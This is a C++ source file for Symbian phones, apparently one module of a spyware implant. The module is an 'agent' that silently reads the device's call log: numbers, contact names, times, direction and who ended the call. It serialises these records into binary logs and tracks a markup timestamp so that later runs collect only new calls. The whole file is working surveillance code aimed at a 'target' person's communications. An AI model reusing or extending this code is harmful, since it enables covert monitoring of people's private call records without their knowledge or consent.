/*
 * AgentCallList.cpp
 *
 *  Created on: 20/mag/2011
 *      Author: Giovanna
 */

#include "AgentCallList.h"
#include "LogFile.h"
#include <HT\TimeUtils.h>

#define LOG_VERSION_01 2008121901

#define OUTGOING 		0x00000001;     // 1=out, 0=in or missed
#define ANSWERED 		0x00000002;    	// 1=answered call
#define TARGET_ENDED	0x00000004; 	// 1=target ended call
#define ROAMING 		0x00000008;     // 1=roamingcall 

enum TCallListType
	{
	NAME = 0x01000000,
	NAMETYPE = 0x02000000,
	NOTE = 0x04000000,
	NUMBER = 0x08000000
	};

typedef struct TCallListHeader
	{
	TUint32 uSize;
	TUint32 uVersion;
	TFileTime iStartCall;
	TFileTime iEndCall;
	TUint32	iFlags;
	TCallListHeader() 
		{
		uVersion = LOG_VERSION_01;
		iFlags = 0;
		}
	} TCallListHeader;

CAgentCallList::CAgentCallList() : CAbstractAgent(EAgent_CallList)
	{
	// No implementation required
	}

CAgentCallList::~CAgentCallList()
	{
	__FLOG(_L("Destructor"));
	delete iCallLogReader;
	delete iMarkupFile;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentCallList* CAgentCallList::NewLC(const TDesC8& params)
	{
	CAgentCallList* self = new (ELeave) CAgentCallList();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentCallList* CAgentCallList::NewL(const TDesC8& params)
	{
	CAgentCallList* self = CAgentCallList::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentCallList::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_CallList.txt");
	__FLOG(_L("-------------"));
		
	iMarkupFile = CLogFile::NewL(iFs);
	iCallLogReader = CCallLogReader::NewL(*this,iFs);
	}

void CAgentCallList::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	CreateLogL(LOGTYPE_CALLLIST);
	
	// if markup exists, set iTimestamp to that value
	// otherwise initialize iTimestamp to an initial value
	if(iMarkupFile->ExistsMarkupL(Type()))
		{
		// retrieve iTimestamp
		RBuf8 timeBuffer(iMarkupFile->ReadMarkupL(Type()));
		timeBuffer.CleanupClosePushL();
		TInt64 timestamp;
		Mem::Copy(&timestamp,timeBuffer.Ptr(),sizeof(timestamp));
		CleanupStack::PopAndDestroy(&timeBuffer);		
		iTimestamp = timestamp;
		// we add just a microsecond to the timestamp so that we are sure not to take 
		// the contact of the timestamp saved into markup
		TTimeIntervalMicroSeconds oneMicroSecond = 1;
		iTimestamp += oneMicroSecond;
		} 
	else 
		{
		_LIT(KInitTime,"16010000:000000");
		iTimestamp.Set(KInitTime);
		}

	if(iCallLogReader)
		{
		iCallLogReader->ReadCallLogL();
		}
	}

void CAgentCallList::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
	CloseLogL(); 
	}

void CAgentCallList::HandleCallLogEventL(TInt aDirection,const CLogEvent& aEvent)
	{
	TTime time = aEvent.Time();
	if(iTimestamp < time)
		{
		HBufC8* buf = GetCallLogBufferL(aDirection, aEvent);
		if (buf->Length() > 0)
			{
			// dump the buffer to the file log. 
			AppendLogL(*buf);
			}
		delete buf;
		iTimestamp = time;
		}
	}


void CAgentCallList::CallLogProcessed(TInt aError)
	{
	// we've finished to read call history
	// write markup: the date of the most recent call
	RBuf8 buf(GetTTimeBufferL(iTimestamp));
	buf.CleanupClosePushL();
	if (buf.Length() > 0)
		{
		iMarkupFile->WriteMarkupL(Type(),buf);
		}
	CleanupStack::PopAndDestroy(&buf);
	}

HBufC8* CAgentCallList::GetCallLogBufferL(TInt aDirection, const CLogEvent& aEvent)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TCallListHeader callHeader;
	
	// set time
	TTime startTTime;
	startTTime = aEvent.Time();
	TTime endTTime(startTTime.Int64());
	TTimeIntervalSeconds secDuration(aEvent.Duration());
	endTTime += secDuration;
	TInt64 startTime = TimeUtils::GetFiletime(startTTime);
	TInt64 endTime = TimeUtils::GetFiletime(endTTime);
	callHeader.iStartCall.dwHighDateTime = (startTime >> 32);
	callHeader.iStartCall.dwLowDateTime = (startTime & 0xFFFFFFFF);
	callHeader.iEndCall.dwHighDateTime = (endTime >> 32);
	callHeader.iEndCall.dwLowDateTime = (endTime & 0xFFFFFFFF);
	
	// set flags
	if(aDirection == EDirMissed)
		{
		callHeader.iFlags = 0;
		}
	else if (aDirection == EDirOut)
		{
		callHeader.iFlags |= OUTGOING;
		if(aEvent.Duration() != 0)
			{
			callHeader.iFlags |= ANSWERED;
			}
		}
	else if (aDirection == EDirIn)
		{
		callHeader.iFlags |= ANSWERED;
		}
	
	TInt size;
	TUint8* ptrData;
	TUint32 typeAndLen;
	// optional data
	// telephone number
	size = aEvent.Number().Size();
	if(size !=0)
		{
		ptrData = (TUint8 *)aEvent.Number().Ptr();
		typeAndLen = NUMBER;
		typeAndLen += size;
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, size);
		}
	// name into contacts
	size = aEvent.RemoteParty().Size();
	if(size!=0)
		{
		ptrData = (TUint8 *)aEvent.RemoteParty().Ptr();
		typeAndLen = NAME;
		typeAndLen += size;
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), ptrData, size);
		}
	
	// insert header
	callHeader.uSize = sizeof(callHeader) + buffer->Size();
	buffer->InsertL(0, &callHeader, sizeof(callHeader));
		
	HBufC8* result = buffer->Ptr(0).AllocL();
		
	CleanupStack::PopAndDestroy(buffer);
		
	return result;
	}

HBufC8* CAgentCallList::GetTTimeBufferL(const TTime aTime)
{
	TInt64 timestamp = aTime.Int64();
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(timestamp);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &timestamp, sizeof(timestamp));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}
